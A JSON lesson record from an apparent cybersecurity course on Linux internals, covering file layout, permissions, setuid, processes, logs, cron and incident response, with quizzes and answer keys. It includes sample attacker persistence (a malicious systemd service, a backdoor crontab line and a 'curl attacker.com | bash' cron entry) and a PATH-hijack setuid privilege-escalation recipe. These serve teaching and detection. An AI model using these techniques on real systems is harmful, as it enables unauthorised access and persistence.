{
  "lesson_id": "8b7a6c5d-4e3f-2a1b-0c9d-8e7f6a5b4c3d",
  "domain": "system",
  "title": "Linux Internals Fundamentals",
  "difficulty": 2,
  "order_index": 4,
  "prerequisites": [
    "3ad9d1e7-f1b9-49fc-b0e6-2df0d8614aff"
  ],
  "concepts": [
    "Linux File System",
    "Processes and Daemons",
    "Users and Permissions",
    "init Systems",
    "procfs",
    "Linux Logs",
    "Cron Jobs",
    "setuid and Capabilities"
  ],
  "content_blocks": [
    {
      "block_id": "1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d",
      "type": "mindset_coach",
      "content": {
        "text": "Linux powers the majority of servers, cloud infrastructure, and critical systems worldwide. Understanding Linux internals isn't optional for cybersecurity professionals - it's essential. Here's why:\n\nMost enterprise servers run Linux. Most cloud instances (AWS, Azure, GCP) run Linux. Most containers (Docker, Kubernetes) run on Linux. Most security tools (SIEM, IDS/IPS, forensic tools) run on Linux. If you can't secure, attack, or investigate Linux systems, you're missing 70%+ of the infrastructure landscape.\n\nThe beautiful part: Linux is transparent. Unlike Windows (where internals are hidden), Linux exposes everything:\n- /proc shows real-time process and kernel information\n- /var/log records system events\n- /etc contains all configuration files\n- Everything is a file (devices, processes, network connections)\n\nThis transparency means:\n- As an attacker: Deep system access when you gain root\n- As a defender: Rich forensic artifacts and monitoring capabilities\n- As an analyst: Complete visibility into system behavior\n\nMany people find Linux intimidating because it's command-line focused. Here's the reality: The command line is your superpower. Once you master 20-30 core commands, you can accomplish more in Linux than clicking through Windows GUIs for hours.\n\nThink of Linux like a city with clear blueprints:\n- /etc = City hall (configuration and rules)\n- /var/log = Security cameras (audit trails)\n- /proc = Live city monitoring dashboard\n- /bin, /sbin = City utilities and infrastructure\n\nUnderstanding this architecture makes attack detection, incident response, and system hardening straightforward and systematic."
      },
      "simplified_explanation": "Linux = open, transparent operating system. Everything is a file. /proc shows live system state. /var/log shows history. /etc contains configurations. Understanding Linux file structure, processes, users, and permissions unlocks security mastery.",
      "memory_aids": [
        "Root (/) is like C:\\ in Windows - the beginning of everything",
        "/etc = Et Cetera = Configuration files",
        "/var = Variable data (logs, databases, temp files)",
        "/proc = Process information (live kernel data)",
        "rwxrwxrwx = Read Write Execute for Owner, Group, Others"
      ],
      "teach_like_im_10": "Linux is like a very organized house. Each room (directory) has a specific purpose: /bin has tools you use every day, /etc has instruction manuals and rules, /var/log is like a diary recording everything that happens, /proc is like a magical window showing what's happening right now. The owner decides who can enter each room (permissions)."
    },
    {
      "block_id": "2b3c4d5e-6f7a-8b9c-0d1e-2f3a4b5c6d7e",
      "type": "explanation",
      "content": {
        "text": "## Linux File System Hierarchy\n\n### Understanding the Root Directory\n\nLinux uses a single hierarchical directory structure starting from **/** (root).\n\n**Critical Directories**:\n\n**/ (Root)**\n- Top of filesystem hierarchy\n- All other directories branch from here\n\n**/bin (Essential User Binaries)**\n- Essential command-line programs needed for system boot and single-user mode\n- Examples: ls, cp, mv, cat, bash, grep\n- Available to all users\n\n**/sbin (System Binaries)**\n- Essential system administration programs\n- Examples: iptables, reboot, fdisk, ifconfig, systemctl\n- Typically requires root privileges\n\n**/etc (Configuration Files)**\n- System-wide configuration files\n- Critical files:\n- **/etc/passwd**: User account information\n- **/etc/shadow**: Encrypted passwords (requires root to read)\n- **/etc/group**: Group memberships\n- **/etc/sudoers**: Sudo privileges\n- **/etc/ssh/sshd_config**: SSH server configuration\n- **/etc/crontab**: Scheduled tasks\n- **Security Note**: Attackers often modify /etc/passwd, /etc/shadow, /etc/sudoers for persistence\n\n**/home (User Home Directories)**\n- Each user has directory: /home/username\n- User's files, configurations, bash history\n- **Forensic Value**: ~/.bash_history shows command history (what user executed)\n\n**/root (Root User's Home)**\n- Home directory for root user\n- Separate from /home for security\n- Contains root's bash history, SSH keys, configuration\n\n**/var (Variable Data)**\n- Data that changes frequently:\n- **/var/log**: Log files (system events, authentication, application logs)\n- **/var/spool**: Mail, print queues, cron jobs\n- **/var/tmp**: Temporary files (persists across reboots)\n- **/var/www**: Web server files (Apache/Nginx)\n- **Forensic Goldmine**: /var/log contains authentication logs, command history, system events\n\n**/tmp (Temporary Files)**\n- Temporary storage for applications\n- **Security Risk**: World-writable (any user can write)\n- Cleared on reboot (in most distributions)\n- **Attack Vector**: Malware often writes to /tmp, executes from there\n\n**/proc (Process Information)**\n- Virtual filesystem showing live kernel and process information\n- Not stored on disk (exists only in memory)\n- **Examples**:\n- **/proc/[PID]/cmdline**: Command line of process\n- **/proc/[PID]/environ**: Environment variables\n- **/proc/[PID]/exe**: Symbolic link to executable\n- **/proc/[PID]/fd/**: Open file descriptors\n- **/proc/cpuinfo**: CPU information\n- **/proc/meminfo**: Memory usage\n- **/proc/net/tcp**: Active TCP connections\n- **Forensic Use**: Analyze running processes, recover deleted executables (from /proc/[PID]/exe)\n\n**/sys (System and Kernel Information)**\n- Virtual filesystem for kernel objects\n- Hardware and driver information\n- Example: /sys/class/net/eth0 (network interface info)\n\n**/dev (Device Files)**\n- Special files representing hardware devices\n- Examples:\n- /dev/sda: First hard drive\n- /dev/null: Discards all data written to it\n- /dev/random: Random number generator\n- /dev/tty: Terminal devices\n- **Attack Use**: Attackers may write to /dev/null to hide output\n\n**/boot (Boot Loader Files)**\n- Kernel, bootloader (GRUB), initial ramdisk\n- **Security**: Unauthorized modification can brick system or install rootkit\n\n**/lib, /lib64 (Shared Libraries)**\n- Shared libraries needed by /bin and /sbin programs\n- Equivalent to Windows DLLs\n- **Attack Vector**: LD_PRELOAD rootkits replace libraries to hide malware\n\n**/usr (User Programs)**\n- **/usr/bin**: Non-essential user programs (python, vim, gcc)\n- **/usr/sbin**: Non-essential system programs\n- **/usr/local**: Locally compiled programs\n- Generally read-only for regular users\n\n## Linux Users and Permissions\n\n### User Types\n\n**1. root (UID 0)**\n- Superuser with complete system access\n- Can read/write/execute any file\n- Can kill any process\n- Can modify kernel\n- **Security Best Practice**: Never log in directly as root; use sudo instead\n\n**2. Regular Users (UID >= 1000)**\n- Limited to their own files and explicitly granted permissions\n- Cannot modify system files, install software system-wide, or access other users' files (by default)\n\n**3. System/Service Users (UID < 1000)**\n- Accounts for services (www-data, mysql, sshd)\n- Usually no login shell (/usr/sbin/nologin)\n- Principle of least privilege: Service runs as dedicated user with minimal permissions\n\n### User Account Files\n\n**/etc/passwd** (World-readable):\n```\nroot:x:0:0:root:/root:/bin/bash\njohn:x:1000:1000:John Doe:/home/john:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n```\n\nFormat: `username:password:UID:GID:comment:home_directory:shell`\n- **x** in password field means password stored in /etc/shadow\n- UID 0 = root\n- Shell /usr/sbin/nologin = account cannot login interactively\n\n**/etc/shadow** (Only root can read):\n```\nroot:$6$random_salt$hashed_password:18000:0:99999:7:::\njohn:$6$random_salt$hashed_password:18500:0:99999:7:::\nwww-data:*:18000:0:99999:7:::\n```\n\nFormat: `username:encrypted_password:last_change:min_days:max_days:warn:inactive:expire`\n- **$6$** = SHA-512 hashing\n- ***** or **!** = account locked (cannot login)\n\n**Attack**: Attackers dump /etc/shadow and crack hashes offline using john or hashcat\n\n**/etc/sudoers** (Sudo privileges):\n```bash\n# User privilege specification\nroot    ALL=(ALL:ALL) ALL\njohn    ALL=(ALL:ALL) ALL\n\n# Allow www-data to restart web server without password\nwww-data ALL=(ALL) NOPASSWD: /bin/systemctl restart apache2\n```\n\n**Explanation**:\n- `john ALL=(ALL:ALL) ALL`: John can run any command as any user on any host\n- `NOPASSWD`: No password required (dangerous if misconfigured)\n\n**Attack Vector**: Attackers modify /etc/sudoers to grant themselves sudo access\n\n### File Permissions\n\n**Permission Model**: Every file has permissions for **Owner**, **Group**, and **Others**.\n\n**Permission Types**:\n- **r (Read)**: View file contents / list directory contents\n- **w (Write)**: Modify file / add/delete files in directory\n- **x (Execute)**: Execute file as program / enter directory\n\n**Example**:\n```bash\nls -l /etc/shadow\n-rw-r----- 1 root shadow 1234 Oct 26 14:30 /etc/shadow\n```\n\nBreakdown:\n```\n-          rw-       r--       ---\nFile type  Owner     Group     Others\n(root)    (shadow)  (no permissions)\n```\n\n- **File type**: `-` (regular file), `d` (directory), `l` (symbolic link)\n- **Owner (root)**: rw- (read, write, no execute)\n- **Group (shadow)**: r-- (read only)\n- **Others**: --- (no permissions)\n\n**Numeric Representation**:\n- r = 4, w = 2, x = 1\n- rwx = 7, rw- = 6, r-x = 5, r-- = 4\n\nExample:\n```bash\nchmod 644 file.txt\n# Owner: rw- (6 = 4+2)\n# Group: r-- (4)\n# Others: r-- (4)\n```bash\n\n### Special Permissions\n\n**setuid (Set User ID)**\n- When executed, process runs with file owner's privileges (not executor's)\n- Example: /usr/bin/passwd (allows users to change password, which requires writing to /etc/shadow)\n\n```bash\nls -l /usr/bin/passwd\n-rwsr-xr-x 1 root root 59640 /usr/bin/passwd\n#   ^ setuid bit (s instead of x)\n```\n\n**Security Implication**: If attacker finds vulnerable setuid binary owned by root, they can escalate to root.\n\n**Finding setuid binaries**:\n```bash\nfind / -perm -4000 -type f 2>/dev/null\n```\n\n**setgid (Set Group ID)**\n- Process runs with file's group privileges\n- On directories: New files inherit directory's group\n\n**Sticky Bit**\n- On directories: Only file owner can delete their own files (even if directory is world-writable)\n- Example: /tmp (prevents users from deleting each other's temp files)\n\n```bash\nls -ld /tmp\ndrwxrwxrwt 10 root root 4096 /tmp\n#         ^ sticky bit (t instead of x)\n```bash\n\n### Linux Capabilities (Alternative to setuid)\n\nInstead of full root privileges, grant specific capabilities:\n\n**Examples**:\n- **CAP_NET_BIND_SERVICE**: Bind to ports < 1024 (without being root)\n- **CAP_SYS_ADMIN**: Mount filesystems\n- **CAP_SYS_PTRACE**: Debug processes\n\n**View capabilities**:\n```bash\ngetcap /usr/bin/python3.8\n/usr/bin/python3.8 = cap_net_bind_service+ep\n```\n\n**Attack**: If attacker gains capability like CAP_SYS_MODULE, they can load kernel modules (rootkit).\n\n## Linux Processes\n\n### Process Hierarchy\n\nLinux processes form a tree with **init** (PID 1) as the root.\n\n**Init Systems**:\n- **systemd** (modern): PID 1 on Ubuntu 16.04+, CentOS 7+, Debian 8+\n- **SysVinit** (legacy): Older distributions\n- **Upstart**: Ubuntu 14.04 and earlier\n\n**Process Tree Example**:\n```\nsystemd (PID 1)\n├── sshd (PID 500)\n│   └── sshd (PID 1200, user connection)\n│       └── bash (PID 1201)\n│           └── python script.py (PID 1250)\n├── apache2 (PID 600)\n│   ├── apache2 worker (PID 601)\n│   └── apache2 worker (PID 602)\n└── cron (PID 700)\n└── backup.sh (PID 1300)\n```bash\n\n### Viewing Processes\n\n**ps command**:\n```bash\n# All processes\nps aux\n\n# Process tree\nps auxf\n\n# Specific user\nps -u john\n\n# Processes by name\nps aux | grep apache\n```\n\n**top / htop** (real-time process viewer):\n```bash\ntop\n# Press 'k' to kill process\n# Press 'M' to sort by memory\n# Press 'P' to sort by CPU\n\nhtop  # Enhanced version with better UI\n```\n\n**/proc filesystem**:\n```bash\n# Command line of process 1234\ncat /proc/1234/cmdline\n\n# Environment variables\ncat /proc/1234/environ | tr '\\0' '\\n'\n\n# Open files\nls -l /proc/1234/fd/\n\n# Network connections\ncat /proc/1234/net/tcp\n\n# Executable path (even if deleted)\nls -l /proc/1234/exe\n```\n\n**Forensic Use**: Even if attacker deletes malware binary, /proc/[PID]/exe still points to it in memory. You can copy the executable:\n```bash\ncp /proc/1234/exe /tmp/recovered_malware\n```bash\n\n### Daemons (Background Services)\n\nDaemons are background processes providing services.\n\n**Common Daemons**:\n- **sshd**: SSH server\n- **apache2/httpd**: Web server\n- **mysqld**: Database server\n- **cron**: Task scheduler\n- **rsyslogd**: Logging daemon\n\n**Managing Services (systemd)**:\n```bash\n# Start service\nsystemctl start apache2\n\n# Stop service\nsystemctl stop apache2\n\n# Enable service (start at boot)\nsystemctl enable apache2\n\n# Disable service\nsystemctl disable apache2\n\n# Check status\nsystemctl status apache2\n\n# List all services\nsystemctl list-units --type=service\n```\n\n**Service Files** (/etc/systemd/system/, /lib/systemd/system/):\n```ini\n[Unit]\nDescription=Apache Web Server\nAfter=network.target\n\n[Service]\nType=forking\nExecStart=/usr/sbin/apache2ctl start\nExecStop=/usr/sbin/apache2ctl stop\nRestart=on-failure\n\n[Install]\nWantedBy=multi-user.target\n```\n\n**Attack**: Attackers create malicious systemd service for persistence:\n```bash\n# Create malicious service\ncat > /etc/systemd/system/malware.service <<EOF\n[Unit]\nDescription=System Update Service\n\n[Service]\nExecStart=/tmp/malware\nRestart=always\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\n# Enable and start\nsystemctl daemon-reload\nsystemctl enable malware.service\nsystemctl start malware.service\n```bash\n\n## Linux Logs\n\n### Critical Log Locations (/var/log)\n\n**/var/log/auth.log** (Debian/Ubuntu) or **/var/log/secure** (RHEL/CentOS):\n- Authentication events (login, sudo, SSH)\n- **Forensic Use**: Track who logged in, when, from where\n\nExample:\n```\nOct 26 14:30:15 server sshd[1234]: Accepted publickey for john from 192.168.1.100 port 50000 ssh2\nOct 26 14:35:20 server sudo: john : TTY=pts/0 ; PWD=/home/john ; USER=root ; COMMAND=/bin/cat /etc/shadow\n```\n\n**/var/log/syslog** (Debian/Ubuntu) or **/var/log/messages** (RHEL/CentOS):\n- General system messages\n- Kernel messages, service start/stop, errors\n\n**/var/log/kern.log**:\n- Kernel messages\n- Hardware errors, driver issues\n\n**/var/log/apache2/access.log** (or /var/log/httpd/access_log):\n- Web server access logs\n- **Forensic Use**: Web attacks, SQL injection attempts, path traversal\n\nExample:\n```\n192.168.1.50 - - [26/Oct/2025:14:40:30 +0000] \"GET /admin.php?id=1' OR '1'='1 HTTP/1.1\" 200 1234\n```\n\n**/var/log/apache2/error.log**:\n- Web server errors\n- PHP errors, failed requests\n\n**/var/log/mysql/error.log**:\n- Database errors\n\n**/var/log/faillog**:\n- Failed login attempts\n\n```bash\n# View failed logins\nfaillog -a\n```\n\n**/var/log/wtmp** (binary file):\n- Login history\n\n```bash\n# View login history\nlast\n# Output:\njohn  pts/0  192.168.1.100  Fri Oct 26 14:30 - 15:00  (00:30)\nroot  pts/1  192.168.1.200  Fri Oct 26 12:00 - 12:15  (00:15)\n```\n\n**/var/log/btmp** (binary file):\n- Failed login attempts\n\n```bash\n# View failed logins\nlastb\n```\n\n**User Command History**:\n```bash\n# Bash history (per user)\ncat ~/.bash_history\ncat /root/.bash_history\n\n# Forensic value: Shows exactly what commands user executed\n```bash\n\n### Log Analysis for Incident Response\n\n**Hunting for SSH Brute Force**:\n```bash\ngrep \"Failed password\" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr\n# Shows IPs with most failed login attempts\n```\n\n**Finding Sudo Usage**:\n```bash\ngrep \"sudo\" /var/log/auth.log | grep \"COMMAND\"\n# Shows all sudo commands executed\n```\n\n**Web Attack Detection**:\n```bash\n# SQL injection attempts\ngrep -i \"union.*select\" /var/log/apache2/access.log\n\n# Path traversal attempts\ngrep \"\\\\.\\\\.\" /var/log/apache2/access.log\n\n# Command injection attempts\ngrep -E \"(;|\\\\||\\`|\\$\\()\" /var/log/apache2/access.log\n```bash\n\n## Scheduled Tasks (cron)\n\n**Cron** executes commands on a schedule (like Windows Task Scheduler).\n\n**Crontab Syntax**:\n```\n* * * * * command\n│ │ │ │ │\n│ │ │ │ └─── Day of week (0-7, 0 and 7 = Sunday)\n│ │ │ └───── Month (1-12)\n│ │ └─────── Day of month (1-31)\n│ └───────── Hour (0-23)\n└─────────── Minute (0-59)\n```\n\n**Examples**:\n```bash\n# Every day at 2 AM\n0 2 * * * /usr/local/bin/backup.sh\n\n# Every 5 minutes\n*/5 * * * * /usr/local/bin/check_status.sh\n\n# Every Monday at 9 AM\n0 9 * * 1 /usr/local/bin/weekly_report.sh\n```\n\n**Viewing Cron Jobs**:\n```bash\n# User's crontab\ncrontab -l\n\n# Root's crontab\nsudo crontab -l\n\n# System-wide crontab\ncat /etc/crontab\n\n# Cron directories\nls /etc/cron.d/\nls /etc/cron.daily/\nls /etc/cron.hourly/\nls /etc/cron.weekly/\nls /etc/cron.monthly/\n```\n\n**Attack**: Malware adds cron job for persistence:\n```bash\n# Attacker adds to root's crontab\n(crontab -l; echo \"*/10 * * * * /tmp/.hidden/backdoor.sh\") | crontab -\n# Runs backdoor.sh every 10 minutes\n```\n\n**Defense**:\n```bash\n# Audit all cron jobs\nfor user in $(cut -f1 -d: /etc/passwd); do\necho \"Crontab for $user:\"\ncrontab -u $user -l 2>/dev/null\ndone\n```bash\n\n## Key Takeaways\n\n1. **Linux file structure is hierarchical** from / with specific purposes (/etc=config, /var/log=logs, /proc=live system info)\n2. **Everything is a file** including devices, processes, network connections\n3. **Three permission levels**: Owner, Group, Others with Read, Write, Execute (rwx)\n4. **setuid binaries run with owner's privileges** - major privilege escalation vector\n5. **root (UID 0) has complete system access** - use sudo instead of logging in as root\n6. **/etc/passwd, /etc/shadow, /etc/sudoers** control user authentication and privileges\n7. **/var/log** contains forensic goldmine: auth.log, syslog, web logs, command history\n8. **/proc filesystem** shows live process information including deleted executables\n9. **systemd manages services** - attackers create malicious services for persistence\n10. **cron schedules tasks** - common persistence mechanism for malware\n\nLinux transparency (everything exposed in /proc, /var/log, /etc) makes it powerful for both attackers and defenders. Master the fundamentals and you unlock deep system visibility."
      },
      "ascii_art": "LINUX FILE SYSTEM HIERARCHY\n\n/  (root)\n├── bin/        (essential user programs)\n├── sbin/       (system administration)\n├── etc/        (configuration files)\n│   ├── passwd  (user accounts)\n│   ├── shadow  (encrypted passwords)\n│   └── sudoers (sudo privileges)\n├── home/       (user directories)\n│   ├── john/\n│   └── alice/\n├── root/       (root's home)\n├── var/        (variable data)\n│   ├── log/    (LOGS - forensic goldmine)\n│   │   ├── auth.log (authentication)\n│   │   ├── syslog   (system events)\n│   │   └── apache2/ (web server)\n│   └── www/    (web files)\n├── tmp/        (temporary files - WRITABLE BY ALL)\n├── proc/       (live process info - virtual)\n│   ├── 1234/   (process PID 1234)\n│   │   ├── cmdline\n│   │   ├── environ\n│   │   └── exe -> /usr/bin/python\n│   └── cpuinfo\n├── dev/        (device files)\n└── usr/        (user applications)\n    ├── bin/\n    └── sbin/\n\nPERMISSIONS EXAMPLE\n\n-rwxr-xr--  1 root  admin  4096 Oct 26 14:30 script.sh\n│││││││││  │  │     │      │    │            │\n│││││││││  │  │     │      │    │            └─ Filename\n│││││││││  │  │     │      │    └─ Timestamp\n│││││││││  │  │     │      └─ Size (bytes)\n│││││││││  │  │     └─ Group\n│││││││││  │  └─ Owner\n│││││││││  └─ Hard links\n││││││││└─ Others: r-- (read only)\n│││││└└└─ Group: r-x (read, execute)\n││└└└─ Owner: rwx (read, write, execute)\n└─ File type: - (regular file)\n           d (directory)\n           l (symbolic link)",
      "examples": [
        {
          "scenario": "Detecting SSH Brute Force Attack",
          "explanation": "SOC analyst reviews /var/log/auth.log and finds 500+ failed SSH login attempts from IP 203.0.113.50 targeting root account over 10 minutes. Commands: 'grep \"Failed password for root\" /var/log/auth.log | grep \"203.0.113.50\" | wc -l' returns 523. Analyst blocks IP with iptables, reviews if any logins succeeded (none did), checks other servers for same IP (found on 3 others). Implements fail2ban to auto-block IPs after 5 failed attempts. Disables root SSH login (PermitRootLogin no in /etc/ssh/sshd_config)."
        },
        {
          "scenario": "Privilege Escalation via Vulnerable setuid Binary",
          "explanation": "Pentester gains limited shell as www-data user. Enumerates setuid binaries: 'find / -perm -4000 -type f 2>/dev/null'. Finds unusual setuid binary: /usr/local/bin/backup_tool owned by root with vulnerable path in script. backup_tool calls 'tar' without full path. Pentester creates malicious 'tar' in /tmp: '#!/bin/bash\\n/bin/bash -p' (spawns shell with elevated privileges). Sets PATH=/tmp:$PATH, executes backup_tool. Because setuid, backup_tool runs as root, calls attacker's malicious tar, spawns root shell. Pentester now has root access."
        },
        {
          "scenario": "Malware Persistence via Cron and systemd",
          "explanation": "Incident responder investigating compromised web server. Checks cron jobs: 'crontab -l' for www-data user shows: '*/15 * * * * /var/www/.hidden/update.sh'. Examines update.sh - downloads and executes backdoor from attacker server. Also checks systemd services: 'systemctl list-units --type=service --all | grep -i update' reveals 'system-update.service' (suspicious name). Reviews service file: ExecStart points to /tmp/malware. Responder removes cron job, disables malicious service, deletes malware files, reviews /var/log/apache2/access.log to find initial exploitation (web shell upload via vulnerable plugin)."
        }
      ]
    },
    {
      "type": "video",
      "content": {
        "title": "Video: Linux Internals Fundamentals Overview",
        "url": "https://www.youtube.com/embed/6OHVjVtjQVw",
        "description": "Watch this video for a visual introduction to the concepts covered in this lesson."
      }
    },
    {
      "block_id": "3c4d5e6f-7a8b-9c0d-1e2f-3a4b5c6d7e8f",
      "type": "quiz",
      "content": {
        "text": "Test your Linux internals knowledge",
        "questions": [
          {
            "question": "Which directory contains system-wide configuration files?",
            "options": [
              "/var/log",
              "/etc",
              "/usr/bin",
              "/proc"
            ],
            "correct_answer": 1,
            "explanation": "/etc contains all system-wide configuration files (passwd, shadow, sudoers, SSH config, cron config). /var/log contains logs (events), /usr/bin contains programs, /proc is virtual filesystem showing live process information. Remember: etc = et cetera = configuration."
          },
          {
            "question": "What does the 's' in '-rwsr-xr-x' indicate?",
            "options": [
              "System file",
              "Setuid bit - file executes with owner's privileges",
              "Secure file requiring password",
              "Symbolic link"
            ],
            "correct_answer": 1,
            "explanation": "The 's' replacing 'x' in owner permissions indicates setuid bit. When executed, process runs with file owner's privileges instead of executor's. Example: /usr/bin/passwd (setuid root) allows users to change passwords (requires writing to /etc/shadow). Major privilege escalation vector if vulnerable setuid binaries found."
          },
          {
            "question": "An attacker deleted malware binary. How can you recover it from a running process?",
            "options": [
              "Search /tmp directory",
              "Check /var/log for file path",
              "Copy from /proc/[PID]/exe",
              "Restore from /etc/backup"
            ],
            "correct_answer": 2,
            "explanation": "Even if executable deleted from disk, running process holds it in memory. /proc/[PID]/exe is symbolic link to executable (even if deleted). Command: 'cp /proc/[PID]/exe /tmp/recovered_malware' recovers the binary for analysis. This works because kernel maintains reference to executable while process runs."
          },
          {
            "question": "Which file contains encrypted user passwords in modern Linux?",
            "options": [
              "/etc/passwd (world-readable)",
              "/etc/shadow (only root can read)",
              "/etc/sudoers",
              "/root/.passwords"
            ],
            "correct_answer": 1,
            "explanation": "/etc/shadow stores encrypted passwords (only root can read for security). Historically /etc/passwd stored passwords, but since it's world-readable (needed for user info), passwords moved to /etc/shadow. /etc/passwd now shows 'x' in password field pointing to shadow. Attackers dump /etc/shadow to crack passwords offline."
          },
          {
            "question": "What is a common persistence mechanism attackers use in Linux?",
            "options": [
              "Windows registry Run keys",
              "Malicious cron job or systemd service",
              "Modify kernel directly",
              "Create new user accounts only"
            ],
            "correct_answer": 1,
            "explanation": "Attackers commonly use cron jobs (scheduled tasks) or malicious systemd services for persistence. Cron executes commands on schedule, systemd services auto-start at boot. Both survive reboots. Example: Add to crontab '*/10 * * * * /tmp/backdoor' (runs every 10 min). While creating user accounts helps, it's not the primary persistence mechanism."
          }
        ]
      }
    },
    {
      "block_id": "4d5e6f7a-8b9c-0d1e-2f3a-4b5c6d7e8f9a",
      "type": "reflection",
      "content": {
        "text": "## Reflect on Linux Mastery\n\n**Question 1**: You're investigating a compromised web server. What directories and files would you examine first, and why? Consider:\n- Where would malware write files?\n- Where would persistence mechanisms exist?\n- Where would forensic evidence be logged?\n- How would you identify the initial attack vector?\n\n**Question 2**: You find this suspicious entry in /etc/passwd:\n```\nadmin:x:0:0:Admin Account:/home/admin:/bin/bash\n```\nWhat's wrong? What attack does this represent? How would you detect this?\n\n**Question 3**: A process is running from /tmp with these permissions on its executable:\n```\n-rwsr-xr-x 1 root root 24576 Oct 26 15:00 /tmp/update_tool\n```\nWhy is this extremely dangerous? What should you do?\n\n**Question 4**: You discover this cron job for www-data user:\n```\n*/5 * * * * curl http://attacker.com/cmd | bash\n```\nExplain what this does. How often does it run? What defense strategies would prevent this?\n\n**Question 5**: Design a Linux hardening strategy covering:\n- User privilege management (sudo, root access)\n- File permission auditing (setuid, world-writable)\n- Logging and monitoring (what to log, where)\n- Persistence detection (cron, systemd, user accounts)\n\nThink systematically about defense in depth."
      }
    }
  ],
  "estimated_time": 60,
  "learning_objectives": [
    "Understand Linux file system hierarchy and purpose of critical directories",
    "Master Linux permissions model (owner/group/others, rwx, setuid/setgid/sticky)",
    "Identify user account files (/etc/passwd, /etc/shadow, /etc/sudoers) and security implications",
    "Analyze processes using ps, /proc filesystem, and process hierarchy",
    "Locate and analyze critical log files in /var/log for incident response",
    "Detect persistence mechanisms (cron jobs, systemd services, user accounts)",
    "Perform privilege escalation enumeration (setuid binaries, sudo misconfigurations)",
    "Apply Linux knowledge to real-world attack detection and system hardening"
  ],
  "post_assessment": [
    {
      "question": "What is the purpose of the /proc filesystem?",
      "type": "multiple_choice",
      "options": [
        "Stores process executables on disk",
        "Virtual filesystem providing live kernel and process information from memory",
        "Backup directory for critical processes",
        "Logs all process activities"
      ],
      "correct_answer": "Virtual filesystem providing live kernel and process information from memory",
      "explanation": "/proc is a virtual (pseudo) filesystem that doesn't exist on disk - it's generated in memory by the kernel. It provides real-time process information (/proc/[PID]/cmdline, /proc/[PID]/exe) and system information (/proc/cpuinfo, /proc/meminfo). It's not a log, backup, or storage location - it's a window into the live system state.",
      "question_id": "fdbb26be-3b62-4cc9-88e0-d4dbeaa3c3be",
      "difficulty": 2
    },
    {
      "question": "Why are setuid binaries a common privilege escalation vector?",
      "type": "multiple_choice",
      "options": [
        "They execute faster than normal binaries",
        "They run with the file owner's privileges rather than the executor's privileges, so a vulnerable setuid root binary can grant root access",
        "They bypass all file permissions",
        "They can modify kernel settings"
      ],
      "correct_answer": "They run with the file owner's privileges rather than the executor's privileges, so a vulnerable setuid root binary can grant root access",
      "explanation": "Setuid binaries execute with the owner's privileges, not the user running them. If a setuid binary is owned by root and has a vulnerability (command injection, path traversal, etc.), an attacker can exploit it to execute code as root - privilege escalation achieved. Example: vulnerable setuid root binary → attacker exploits → gains root shell.",
      "question_id": "e0f8c355-8dee-44fb-89ac-73f73b35712c",
      "difficulty": 2
    },
    {
      "question": "Which log file would you check to investigate SSH login attempts on Debian/Ubuntu?",
      "type": "multiple_choice",
      "options": [
        "/var/log/syslog",
        "/var/log/auth.log",
        "/var/log/kern.log",
        "/etc/passwd"
      ],
      "correct_answer": "/var/log/auth.log",
      "explanation": "/var/log/auth.log (on Debian/Ubuntu) or /var/log/secure (on RHEL/CentOS) logs authentication events including SSH logins, sudo usage, and failed login attempts. This is the primary log for investigating who logged in, when, and from where. /var/log/syslog is general system events, /var/log/kern.log is kernel messages, /etc/passwd is user account file (not a log).",
      "question_id": "af241ddf-8864-443d-ae2d-061840de2b80",
      "difficulty": 2
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "meta_learning",
    "minimum_effective_dose",
    "teach_like_im_10",
    "memory_hooks",
    "connect_to_what_i_know",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ]
}